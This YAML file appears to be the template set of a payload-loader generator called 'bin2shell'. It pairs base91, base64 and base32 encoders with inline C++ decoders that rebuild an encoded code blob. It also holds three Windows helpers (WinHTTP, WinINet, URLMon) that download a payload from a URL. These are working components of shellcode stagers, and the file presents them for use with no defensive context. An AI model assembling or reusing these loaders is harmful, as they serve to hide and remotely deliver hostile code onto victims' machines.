  - index: 1
    name: base91
    python_snippet: |
      # defines: envelope(data: bytes) -> str
      B91_ALPH = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*+,./:;<=>?@[]^_`{|}~"'
      def envelope(data: bytes) -> str:
          if not data: return ""
          v = 0
          b = 0
          out = []
          for x in data:
              v |= (x & 0xFF) << b
              b += 8
              while b > 13:
                  val = v & 8191
                  if val > 88:
                      v >>= 13; b -= 13
                  else:
                      val = v & 16383; v >>= 14; b -= 14
                  out.append(B91_ALPH[val % 91])
                  out.append(B91_ALPH[val // 91])
          if b:
              out.append(B91_ALPH[v % 91])
              if b > 7 or v > 90:
                  out.append(B91_ALPH[v // 91])
          return "".join(out)
    cpp_decode: |
      const char* B91_ALPH = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*+,./:;<=>?@[]^_`{|}~\"";
      int b91_dec[256];
      for (int i = 0; i < 256; ++i) b91_dec[i] = -1;
      for (int i = 0; i < 91; ++i) b91_dec[(unsigned char)B91_ALPH[i]] = i;

      unsigned int enc_cap = (code_blob_text_len * 13u) / 14u + 8u;
      unsigned char* enc_buf = new unsigned char[enc_cap];
      unsigned int enc_len = 0;

      unsigned int b = 0, n = 0;
      int v = -1;
      for (unsigned int i = 0; i < code_blob_text_len; ++i) {
          unsigned char c = (unsigned char)code_blob_text[i];
          int d = (c < 256) ? b91_dec[c] : -1;
          if (d < 0) continue;
          if (v < 0) v = d;
          else {
              v += d * 91;
              b |= (unsigned int)v << n;
              n += ((v & 8191) > 88) ? 13u : 14u;
              do {
                  enc_buf[enc_len++] = (unsigned char)(b & 0xFFu);
                  b >>= 8u;
                  n -= 8u;
              } while (n > 7u);
              v = -1;
          }
      }
      if (v >= 0) {
          enc_buf[enc_len++] = (unsigned char)((b | (unsigned int)v << n) & 0xFFu);
      }

  - index: 2
    name: base64
    python_snippet: |
      import base64
      def envelope(data: bytes) -> str:
          return base64.b64encode(data).decode('ascii')
    cpp_decode: |
      // naive inline Base64 decode (ASCII only, ignores whitespace)
      int B64_DEC[256]; for (int i=0;i<256;++i) B64_DEC[i]=-1;
      {
          const char* alpha="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
          for (int i=0;i<64;++i) B64_DEC[(unsigned char)alpha[i]] = i;
      }
      unsigned char* enc_buf = new unsigned char[(code_blob_text_len * 3u)/4u + 3u];
      unsigned int enc_len = 0;
      unsigned int val = 0; int valb = -8;
      for (unsigned int i=0;i<code_blob_text_len;++i){
          int d = B64_DEC[(unsigned char)code_blob_text[i]];
          if (d == -1) continue;
          val = (val<<6) | (unsigned)d; valb += 6;
          if (valb >= 0) {
              enc_buf[enc_len++] = (unsigned char)((val>>valb)&0xFFu);
              valb -= 8;
          }
      }

  - index: 3
    name: base32
    python_snippet: |
      import base64
      def envelope(data: bytes) -> str:
          return base64.b32encode(data).decode('ascii')
    cpp_decode: |
      // naive inline Base32 decode (RFC 4648 alphabet), ignores non-alphabet and '=' padding
      int B32_DEC[256]; for (int i=0;i<256;++i) B32_DEC[i] = -1;
      {
          const char* alpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
          for (int i=0;i<32;++i) B32_DEC[(unsigned char)alpha[i]] = i;
      }
      unsigned int enc_cap = (code_blob_text_len * 5u) / 8u + 8u;
      unsigned char* enc_buf = new unsigned char[enc_cap];
      unsigned int enc_len = 0;
      unsigned int val = 0; int valb = -8;
      for (unsigned int i=0;i<code_blob_text_len;++i) {
          unsigned char c = (unsigned char)code_blob_text[i];
          if (c == '=') continue; // skip padding
          int d = B32_DEC[c];
          if (d == -1) continue; // skip non-alphabet
          val = (val << 5) | (unsigned)d; valb += 5;
          if (valb >= 0) {
              enc_buf[enc_len++] = (unsigned char)((val >> valb) & 0xFFu);
              valb -= 8;
          }
      }

web_helpers:
  - index: 0
    name: winhttp
    desc: Windows WinHTTP API (Windows-only, no extra dependencies)
    cpp_includes: |
      #include <stdexcept>
      #include <string>
      #include <vector>
      #include <windows.h>
      #include <winhttp.h>
      #pragma comment(lib, "winhttp.lib")
    cpp_fetch_bytes: |
      static std::vector<unsigned char> bin2shell_fetch_payload_from_url(const std::string& url) {
          auto utf8_to_wide = [](const std::string& s) -> std::wstring {
              if (s.empty()) return {};
              int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
              if (n <= 0) throw std::runtime_error("MultiByteToWideChar failed");
              std::wstring out(static_cast<size_t>(n - 1), L'\0');
              MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, out.data(), n);
              return out;
          };
          struct HInternet {
              HINTERNET h;
              HInternet(HINTERNET h_ = nullptr) : h(h_) {}
              ~HInternet() { if (h) WinHttpCloseHandle(h); }
              HInternet(const HInternet&) = delete;
              HInternet& operator=(const HInternet&) = delete;
          };
          std::wstring wide = utf8_to_wide(url);
          URL_COMPONENTSW uc{}; uc.dwStructSize = sizeof(uc);
          uc.dwHostNameLength = (DWORD)-1; uc.dwUrlPathLength = (DWORD)-1;
          if (!WinHttpCrackUrl(wide.c_str(), 0, 0, &uc))
              throw std::runtime_error("WinHttpCrackUrl failed");
          std::wstring host(uc.lpszHostName, uc.dwHostNameLength);
          std::wstring path(uc.lpszUrlPath, uc.dwUrlPathLength);
          if (path.empty()) path = L"/";
          DWORD flags = (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
          HInternet ses(WinHttpOpen(L"bin2shell/1", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0));
          if (!ses.h) throw std::runtime_error("WinHttpOpen failed");
          HInternet con(WinHttpConnect(ses.h, host.c_str(), uc.nPort, 0));
          if (!con.h) throw std::runtime_error("WinHttpConnect failed");
          HInternet req(WinHttpOpenRequest(con.h, L"GET", path.c_str(), nullptr,
                        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags));
          if (!req.h) throw std::runtime_error("WinHttpOpenRequest failed");
          if (!WinHttpSendRequest(req.h, L"Connection: close\r\n", -1L,
                        WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
              throw std::runtime_error("WinHttpSendRequest failed");
          if (!WinHttpReceiveResponse(req.h, nullptr))
              throw std::runtime_error("WinHttpReceiveResponse failed");
          DWORD sc = 0, ss = sizeof(sc);
          WinHttpQueryHeaders(req.h, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &sc, &ss, WINHTTP_NO_HEADER_INDEX);
          if (sc >= 400) throw std::runtime_error("HTTP error " + std::to_string(sc));
          std::vector<unsigned char> body;
          for (;;) {
              DWORD avail = 0;
              if (!WinHttpQueryDataAvailable(req.h, &avail)) break;
              if (!avail) break;
              size_t off = body.size(); body.resize(off + avail);
              DWORD rd = 0;
              if (!WinHttpReadData(req.h, body.data() + off, avail, &rd)) break;
              body.resize(off + rd);
              if (!rd) break;
          }
          return body;
      }
    cpp_fetch_text: |
      static std::string bin2shell_fetch_payload_text(const std::string& url) {
          auto b = bin2shell_fetch_payload_from_url(url);
          return std::string(b.begin(), b.end());
      }

  - index: 1
    name: wininet
    desc: Windows WinINet API (Windows-only, simpler than WinHTTP)
    cpp_includes: |
      #include <stdexcept>
      #include <string>
      #include <vector>
      #include <windows.h>
      #include <wininet.h>
      #pragma comment(lib, "wininet.lib")
    cpp_fetch_bytes: |
      static std::vector<unsigned char> bin2shell_fetch_payload_from_url(const std::string& url) {
          struct HInternet {
              HINTERNET h;
              HInternet(HINTERNET h_ = nullptr) : h(h_) {}
              ~HInternet() { if (h) InternetCloseHandle(h); }
              HInternet(const HInternet&) = delete;
              HInternet& operator=(const HInternet&) = delete;
          };
          HInternet inet(InternetOpenA("bin2shell/1", INTERNET_OPEN_TYPE_PRECONFIG,
                         nullptr, nullptr, 0));
          if (!inet.h) throw std::runtime_error("InternetOpen failed");
          HInternet conn(InternetOpenUrlA(inet.h, url.c_str(), nullptr, 0,
                         INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0));
          if (!conn.h) throw std::runtime_error("InternetOpenUrl failed");
          std::vector<unsigned char> body;
          char buf[4096];
          DWORD rd = 0;
          while (InternetReadFile(conn.h, buf, sizeof(buf), &rd) && rd > 0) {
              body.insert(body.end(), buf, buf + rd);
              rd = 0;
          }
          return body;
      }
    cpp_fetch_text: |
      static std::string bin2shell_fetch_payload_text(const std::string& url) {
          auto b = bin2shell_fetch_payload_from_url(url);
          return std::string(b.begin(), b.end());
      }

  - index: 2
    name: urlmon
    desc: Windows URLMon IStream download (Windows-only, minimal code)
    cpp_includes: |
      #include <stdexcept>
      #include <string>
      #include <vector>
      #include <windows.h>
      #include <urlmon.h>
      #pragma comment(lib, "urlmon.lib")
    cpp_fetch_bytes: |
      static std::vector<unsigned char> bin2shell_fetch_payload_from_url(const std::string& url) {
          IStream* pstm = nullptr;
          HRESULT hr = URLOpenBlockingStreamA(nullptr, url.c_str(), &pstm, 0, nullptr);
          if (FAILED(hr) || !pstm)
              throw std::runtime_error("URLOpenBlockingStream failed");
          std::vector<unsigned char> body;
          char buf[4096];
          ULONG rd = 0;
          for (;;) {
              HRESULT rhr = pstm->Read(buf, sizeof(buf), &rd);
              if (rd > 0) body.insert(body.end(), buf, buf + rd);
              if (rhr != S_OK) break;
              rd = 0;
          }
          pstm->Release();
          return body;
      }
    cpp_fetch_text: |
      static std::string bin2shell_fetch_payload_text(const std::string& url) {
          auto b = bin2shell_fetch_payload_from_url(url);
          return std::string(b.begin(), b.end());
      }

